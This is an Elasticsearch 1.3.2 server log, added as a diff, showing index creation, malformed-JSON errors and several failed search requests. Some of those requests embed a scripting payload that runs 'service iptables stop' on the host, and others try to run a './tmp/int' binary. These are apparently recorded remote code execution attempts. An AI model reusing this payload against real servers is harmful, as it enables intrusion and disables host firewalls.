@@ -1,0 +1,426 @@
+[2015-08-21 06:51:51,861][INFO ][node                     ] [Victorius] version[1.3.2], pid[7293], build[dee175d/2014-08-13T14:29:30Z]
+[2015-08-21 06:51:51,862][INFO ][node                     ] [Victorius] initializing ...
+[2015-08-21 06:51:51,865][INFO ][plugins                  ] [Victorius] loaded [], sites []
+[2015-08-21 06:51:54,691][INFO ][node                     ] [Victorius] initialized
+[2015-08-21 06:51:54,692][INFO ][node                     ] [Victorius] starting ...
+[2015-08-21 06:51:54,787][INFO ][transport                ] [Victorius] bound_address {inet[/0:0:0:0:0:0:0:0:9300]}, publish_address {inet[/172.31.2.104:9300]}
+[2015-08-21 06:51:54,818][INFO ][discovery                ] [Victorius] elasticsearch/GhygkqtsSzq8NU6NE1gSrw
+[2015-08-21 06:51:57,839][INFO ][cluster.service          ] [Victorius] new_master [Victorius][GhygkqtsSzq8NU6NE1gSrw][ip-172-31-2-104][inet[/172.31.2.104:9300]], reason: zen-disco-join (elected_as_master)
+[2015-08-21 06:51:57,866][INFO ][http                     ] [Victorius] bound_address {inet[/0:0:0:0:0:0:0:0:9200]}, publish_address {inet[/172.31.2.104:9200]}
+[2015-08-21 06:51:57,866][INFO ][node                     ] [Victorius] started
+[2015-08-21 06:51:57,878][INFO ][gateway                  ] [Victorius] recovered [0] indices into cluster_state
+[2015-08-21 06:53:32,450][INFO ][cluster.metadata         ] [Victorius] [customer] creating index, cause [auto(index api)], shards [5]/[1], mappings []
+[2015-08-21 06:53:32,950][INFO ][cluster.metadata         ] [Victorius] [customer] update_mapping [external] (dynamic)
+[2015-08-21 06:55:34,791][DEBUG][action.index             ] [Victorius] [customer][3], node[GhygkqtsSzq8NU6NE1gSrw], [P], s[STARTED]: Failed to execute [index {[customer][external][2], source[_na_]}]
+org.elasticsearch.index.mapper.MapperParsingException: failed to parse
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:555)
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:483)
+	at org.elasticsearch.index.shard.service.InternalIndexShard.prepareIndex(InternalIndexShard.java:397)
+	at org.elasticsearch.action.index.TransportIndexAction.shardOperationOnPrimary(TransportIndexAction.java:191)
+	at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction.performOnPrimary(TransportShardReplicationOperationAction.java:522)
+	at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction$1.run(TransportShardReplicationOperationAction.java:421)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.ElasticsearchParseException: Failed to derive xcontent from (offset=0, length=32): [10, 34, 110, 97, 109, 101, 34, 58, 32, 34, 99, 104, 97, 110, 100, 114, 97, 34, 44, 10, 34, 97, 103, 101, 34, 58, 32, 50, 56, 44, 10, 125]
+	at org.elasticsearch.common.xcontent.XContentFactory.xContent(XContentFactory.java:195)
+	at org.elasticsearch.common.xcontent.XContentHelper.createParser(XContentHelper.java:69)
+	at org.elasticsearch.common.xcontent.XContentHelper.createParser(XContentHelper.java:47)
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:497)
+	... 8 more
+[2015-08-21 06:55:51,512][DEBUG][action.index             ] [Victorius] [customer][3], node[GhygkqtsSzq8NU6NE1gSrw], [P], s[STARTED]: Failed to execute [index {[customer][external][2], source[_na_]}]
+org.elasticsearch.index.mapper.MapperParsingException: failed to parse
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:555)
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:483)
+	at org.elasticsearch.index.shard.service.InternalIndexShard.prepareIndex(InternalIndexShard.java:397)
+	at org.elasticsearch.action.index.TransportIndexAction.shardOperationOnPrimary(TransportIndexAction.java:191)
+	at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction.performOnPrimary(TransportShardReplicationOperationAction.java:522)
+	at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction$1.run(TransportShardReplicationOperationAction.java:421)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.ElasticsearchParseException: Failed to derive xcontent from (offset=0, length=31): [10, 34, 110, 97, 109, 101, 34, 58, 32, 34, 99, 104, 97, 110, 100, 114, 97, 34, 44, 10, 34, 97, 103, 101, 34, 58, 32, 50, 56, 10, 125]
+	at org.elasticsearch.common.xcontent.XContentFactory.xContent(XContentFactory.java:195)
+	at org.elasticsearch.common.xcontent.XContentHelper.createParser(XContentHelper.java:69)
+	at org.elasticsearch.common.xcontent.XContentHelper.createParser(XContentHelper.java:47)
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:497)
+	... 8 more
+[2015-08-21 06:56:48,184][DEBUG][action.index             ] [Victorius] [customer][3], node[GhygkqtsSzq8NU6NE1gSrw], [P], s[STARTED]: Failed to execute [index {[customer][external][2], source[_na_]}]
+org.elasticsearch.index.mapper.MapperParsingException: failed to parse
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:555)
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:483)
+	at org.elasticsearch.index.shard.service.InternalIndexShard.prepareIndex(InternalIndexShard.java:397)
+	at org.elasticsearch.action.index.TransportIndexAction.shardOperationOnPrimary(TransportIndexAction.java:191)
+	at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction.performOnPrimary(TransportShardReplicationOperationAction.java:522)
+	at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction$1.run(TransportShardReplicationOperationAction.java:421)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.ElasticsearchParseException: Failed to derive xcontent from (offset=0, length=20): [10, 34, 110, 97, 109, 101, 34, 58, 32, 34, 99, 104, 97, 110, 100, 114, 97, 34, 10, 125]
+	at org.elasticsearch.common.xcontent.XContentFactory.xContent(XContentFactory.java:195)
+	at org.elasticsearch.common.xcontent.XContentHelper.createParser(XContentHelper.java:69)
+	at org.elasticsearch.common.xcontent.XContentHelper.createParser(XContentHelper.java:47)
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:497)
+	... 8 more
+[2015-08-21 06:57:21,337][DEBUG][action.index             ] [Victorius] [customer][3], node[GhygkqtsSzq8NU6NE1gSrw], [P], s[STARTED]: Failed to execute [index {[customer][external][2], source[_na_]}]
+org.elasticsearch.index.mapper.MapperParsingException: failed to parse
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:555)
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:483)
+	at org.elasticsearch.index.shard.service.InternalIndexShard.prepareIndex(InternalIndexShard.java:397)
+	at org.elasticsearch.action.index.TransportIndexAction.shardOperationOnPrimary(TransportIndexAction.java:191)
+	at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction.performOnPrimary(TransportShardReplicationOperationAction.java:522)
+	at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction$1.run(TransportShardReplicationOperationAction.java:421)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.ElasticsearchParseException: Failed to derive xcontent from (offset=0, length=17): [10, 34, 110, 97, 109, 101, 34, 58, 32, 34, 109, 97, 104, 105, 34, 10, 125]
+	at org.elasticsearch.common.xcontent.XContentFactory.xContent(XContentFactory.java:195)
+	at org.elasticsearch.common.xcontent.XContentHelper.createParser(XContentHelper.java:69)
+	at org.elasticsearch.common.xcontent.XContentHelper.createParser(XContentHelper.java:47)
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:497)
+	... 8 more
+[2015-08-21 06:57:46,674][DEBUG][action.index             ] [Victorius] [customer][3], node[GhygkqtsSzq8NU6NE1gSrw], [P], s[STARTED]: Failed to execute [index {[customer][external][2], source[_na_]}]
+org.elasticsearch.index.mapper.MapperParsingException: failed to parse
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:555)
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:483)
+	at org.elasticsearch.index.shard.service.InternalIndexShard.prepareIndex(InternalIndexShard.java:397)
+	at org.elasticsearch.action.index.TransportIndexAction.shardOperationOnPrimary(TransportIndexAction.java:191)
+	at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction.performOnPrimary(TransportShardReplicationOperationAction.java:522)
+	at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction$1.run(TransportShardReplicationOperationAction.java:421)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.ElasticsearchParseException: Failed to derive xcontent from (offset=0, length=32): [10, 34, 110, 97, 109, 101, 34, 58, 32, 34, 99, 104, 97, 110, 100, 114, 97, 34, 44, 10, 34, 97, 103, 101, 34, 58, 32, 50, 56, 44, 10, 125]
+	at org.elasticsearch.common.xcontent.XContentFactory.xContent(XContentFactory.java:195)
+	at org.elasticsearch.common.xcontent.XContentHelper.createParser(XContentHelper.java:69)
+	at org.elasticsearch.common.xcontent.XContentHelper.createParser(XContentHelper.java:47)
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:497)
+	... 8 more
+[2015-08-21 06:58:27,835][DEBUG][action.index             ] [Victorius] [customer][3], node[GhygkqtsSzq8NU6NE1gSrw], [P], s[STARTED]: Failed to execute [index {[customer][external][2], source[
+{
+"name": "mahe",
+"age": age
+}]}]
+org.elasticsearch.index.mapper.MapperParsingException: failed to parse
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:555)
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:483)
+	at org.elasticsearch.index.shard.service.InternalIndexShard.prepareIndex(InternalIndexShard.java:397)
+	at org.elasticsearch.action.index.TransportIndexAction.shardOperationOnPrimary(TransportIndexAction.java:191)
+	at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction.performOnPrimary(TransportShardReplicationOperationAction.java:522)
+	at org.elasticsearch.action.support.replication.TransportShardReplicationOperationAction$AsyncShardOperationAction$1.run(TransportShardReplicationOperationAction.java:421)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.common.jackson.core.JsonParseException: Unrecognized token 'age': was expecting ('true', 'false' or 'null')
+ at [Source: [B@45c69e8; line: 4, column: 12]
+	at org.elasticsearch.common.jackson.core.JsonParser._constructError(JsonParser.java:1419)
+	at org.elasticsearch.common.jackson.core.base.ParserMinimalBase._reportError(ParserMinimalBase.java:508)
+	at org.elasticsearch.common.jackson.core.json.UTF8StreamJsonParser._reportInvalidToken(UTF8StreamJsonParser.java:3201)
+	at org.elasticsearch.common.jackson.core.json.UTF8StreamJsonParser._handleUnexpectedValue(UTF8StreamJsonParser.java:2360)
+	at org.elasticsearch.common.jackson.core.json.UTF8StreamJsonParser.nextToken(UTF8StreamJsonParser.java:748)
+	at org.elasticsearch.common.xcontent.json.JsonXContentParser.nextToken(JsonXContentParser.java:50)
+	at org.elasticsearch.index.mapper.object.ObjectMapper.parse(ObjectMapper.java:503)
+	at org.elasticsearch.index.mapper.DocumentMapper.parse(DocumentMapper.java:534)
+	... 8 more
+[2015-08-21 06:58:53,630][INFO ][cluster.metadata         ] [Victorius] [customer] update_mapping [external] (dynamic)
+[2015-08-21 07:35:18,508][DEBUG][action.search.type       ] [Victorius] [101] Failed to execute fetch phase
+org.elasticsearch.script.groovy.GroovyScriptExecutionException: IOException[Cannot run program "./tmp/int": error=2, No such file or directory]; nested: IOException[error=2, No such file or directory]; 
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService$GroovyScript.run(GroovyScriptEngineService.java:257)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsFetchSubPhase.hitExecute(ScriptFieldsFetchSubPhase.java:74)
+	at org.elasticsearch.search.fetch.FetchPhase.execute(FetchPhase.java:211)
+	at org.elasticsearch.search.SearchService.executeFetchPhase(SearchService.java:459)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$17.call(SearchServiceTransportAction.java:410)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$17.call(SearchServiceTransportAction.java:407)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+[2015-08-21 07:35:18,510][DEBUG][action.search.type       ] [Victorius] [96] Failed to execute fetch phase
+org.elasticsearch.script.groovy.GroovyScriptExecutionException: IOException[Cannot run program "./tmp/int": error=2, No such file or directory]; nested: IOException[error=2, No such file or directory]; 
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService$GroovyScript.run(GroovyScriptEngineService.java:257)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsFetchSubPhase.hitExecute(ScriptFieldsFetchSubPhase.java:74)
+	at org.elasticsearch.search.fetch.FetchPhase.execute(FetchPhase.java:211)
+	at org.elasticsearch.search.SearchService.executeFetchPhase(SearchService.java:459)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$17.call(SearchServiceTransportAction.java:410)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$17.call(SearchServiceTransportAction.java:407)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+[2015-08-21 07:35:19,743][DEBUG][action.search.type       ] [Victorius] [111] Failed to execute fetch phase
+org.elasticsearch.script.groovy.GroovyScriptExecutionException: IOException[Cannot run program "./tmp/int": error=2, No such file or directory]; nested: IOException[error=2, No such file or directory]; 
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService$GroovyScript.run(GroovyScriptEngineService.java:257)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsFetchSubPhase.hitExecute(ScriptFieldsFetchSubPhase.java:74)
+	at org.elasticsearch.search.fetch.FetchPhase.execute(FetchPhase.java:211)
+	at org.elasticsearch.search.SearchService.executeFetchPhase(SearchService.java:459)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$17.call(SearchServiceTransportAction.java:410)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$17.call(SearchServiceTransportAction.java:407)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+[2015-08-21 07:35:22,805][DEBUG][action.search.type       ] [Victorius] [136] Failed to execute fetch phase
+org.elasticsearch.script.groovy.GroovyScriptExecutionException: IOException[Cannot run program "./tmp/int": error=2, No such file or directory]; nested: IOException[error=2, No such file or directory]; 
+	at org.elasticsearch.script.groovy.GroovyScriptEngineService$GroovyScript.run(GroovyScriptEngineService.java:257)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsFetchSubPhase.hitExecute(ScriptFieldsFetchSubPhase.java:74)
+	at org.elasticsearch.search.fetch.FetchPhase.execute(FetchPhase.java:211)
+	at org.elasticsearch.search.SearchService.executeFetchPhase(SearchService.java:459)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$17.call(SearchServiceTransportAction.java:410)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$17.call(SearchServiceTransportAction.java:407)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+[2015-08-21 08:33:17,635][INFO ][cluster.metadata         ] [Victorius] [bank] creating index, cause [auto(bulk api)], shards [5]/[1], mappings []
+[2015-08-21 08:33:18,247][INFO ][cluster.metadata         ] [Victorius] [bank] update_mapping [account] (dynamic)
+[2015-08-21 09:29:33,389][INFO ][node                     ] [Victorius] stopping ...
+[2015-08-21 09:29:33,432][INFO ][node                     ] [Victorius] stopped
+[2015-08-21 09:29:33,432][INFO ][node                     ] [Victorius] closing ...
+[2015-08-21 09:29:33,444][INFO ][node                     ] [Victorius] closed
+[2015-08-21 09:30:14,131][INFO ][node                     ] [Monica Rappaccini] version[1.3.2], pid[28347], build[dee175d/2014-08-13T14:29:30Z]
+[2015-08-21 09:30:14,131][INFO ][node                     ] [Monica Rappaccini] initializing ...
+[2015-08-21 09:30:14,136][INFO ][plugins                  ] [Monica Rappaccini] loaded [], sites []
+[2015-08-21 09:30:17,471][INFO ][node                     ] [Monica Rappaccini] initialized
+[2015-08-21 09:30:17,471][INFO ][node                     ] [Monica Rappaccini] starting ...
+[2015-08-21 09:30:17,570][INFO ][transport                ] [Monica Rappaccini] bound_address {inet[/0:0:0:0:0:0:0:0:9300]}, publish_address {inet[/172.31.2.104:9300]}
+[2015-08-21 09:30:17,598][INFO ][discovery                ] [Monica Rappaccini] elasticsearch/B8SlqrJRQmS_hxBpO3Qygw
+[2015-08-21 09:30:20,625][INFO ][cluster.service          ] [Monica Rappaccini] new_master [Monica Rappaccini][B8SlqrJRQmS_hxBpO3Qygw][ip-172-31-2-104][inet[/172.31.2.104:9300]], reason: zen-disco-join (elected_as_master)
+[2015-08-21 09:30:20,653][INFO ][http                     ] [Monica Rappaccini] bound_address {inet[/0:0:0:0:0:0:0:0:9200]}, publish_address {inet[/172.31.2.104:9200]}
+[2015-08-21 09:30:20,653][INFO ][node                     ] [Monica Rappaccini] started
+[2015-08-21 09:30:21,538][INFO ][gateway                  ] [Monica Rappaccini] recovered [2] indices into cluster_state
+[2015-08-21 09:49:14,859][DEBUG][action.search.type       ] [Monica Rappaccini] [bank][3], node[B8SlqrJRQmS_hxBpO3Qygw], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@65dda5be] lastShard [true]
+org.elasticsearch.search.SearchParseException: [bank][3]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"service iptables stop\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:664)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:515)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:487)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:256)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:206)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:203)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.ScriptException: dynamic scripting for [mvel] disabled
+	at org.elasticsearch.script.ScriptService.verifyDynamicScripting(ScriptService.java:374)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:335)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:509)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:648)
+	... 9 more
+[2015-08-21 09:49:14,866][DEBUG][action.search.type       ] [Monica Rappaccini] [bank][2], node[B8SlqrJRQmS_hxBpO3Qygw], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@65dda5be] lastShard [true]
+org.elasticsearch.search.SearchParseException: [bank][2]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"service iptables stop\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:664)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:515)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:487)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:256)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:206)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:203)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.ScriptException: dynamic scripting for [mvel] disabled
+	at org.elasticsearch.script.ScriptService.verifyDynamicScripting(ScriptService.java:374)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:335)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:509)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:648)
+	... 9 more
+[2015-08-21 09:49:14,859][DEBUG][action.search.type       ] [Monica Rappaccini] [bank][0], node[B8SlqrJRQmS_hxBpO3Qygw], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@65dda5be] lastShard [true]
+org.elasticsearch.search.SearchParseException: [bank][0]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"service iptables stop\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:664)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:515)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:487)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:256)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:206)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:203)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.ScriptException: dynamic scripting for [mvel] disabled
+	at org.elasticsearch.script.ScriptService.verifyDynamicScripting(ScriptService.java:374)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:335)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:509)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:648)
+	... 9 more
+[2015-08-21 09:49:14,869][DEBUG][action.search.type       ] [Monica Rappaccini] [bank][1], node[B8SlqrJRQmS_hxBpO3Qygw], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@65dda5be] lastShard [true]
+org.elasticsearch.search.SearchParseException: [bank][1]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"service iptables stop\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:664)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:515)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:487)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:256)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:206)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:203)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.ScriptException: dynamic scripting for [mvel] disabled
+	at org.elasticsearch.script.ScriptService.verifyDynamicScripting(ScriptService.java:374)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:335)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:509)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:648)
+	... 9 more
+[2015-08-21 09:49:14,870][DEBUG][action.search.type       ] [Monica Rappaccini] [customer][3], node[B8SlqrJRQmS_hxBpO3Qygw], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@65dda5be] lastShard [true]
+org.elasticsearch.search.SearchParseException: [customer][3]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"service iptables stop\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}]]
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:664)
+	at org.elasticsearch.search.SearchService.createContext(SearchService.java:515)
+	at org.elasticsearch.search.SearchService.createAndPutContext(SearchService.java:487)
+	at org.elasticsearch.search.SearchService.executeQueryPhase(SearchService.java:256)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:206)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$5.call(SearchServiceTransportAction.java:203)
+	at org.elasticsearch.search.action.SearchServiceTransportAction$23.run(SearchServiceTransportAction.java:517)
+	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
+	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
+	at java.lang.Thread.run(Thread.java:745)
+Caused by: org.elasticsearch.script.ScriptException: dynamic scripting for [mvel] disabled
+	at org.elasticsearch.script.ScriptService.verifyDynamicScripting(ScriptService.java:374)
+	at org.elasticsearch.script.ScriptService.compile(ScriptService.java:335)
+	at org.elasticsearch.script.ScriptService.search(ScriptService.java:509)
+	at org.elasticsearch.search.fetch.script.ScriptFieldsParseElement.parse(ScriptFieldsParseElement.java:82)
+	at org.elasticsearch.search.SearchService.parseSource(SearchService.java:648)
+	... 9 more
+[2015-08-21 09:49:14,870][DEBUG][action.search.type       ] [Monica Rappaccini] [customer][2], node[B8SlqrJRQmS_hxBpO3Qygw], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@65dda5be] lastShard [true]
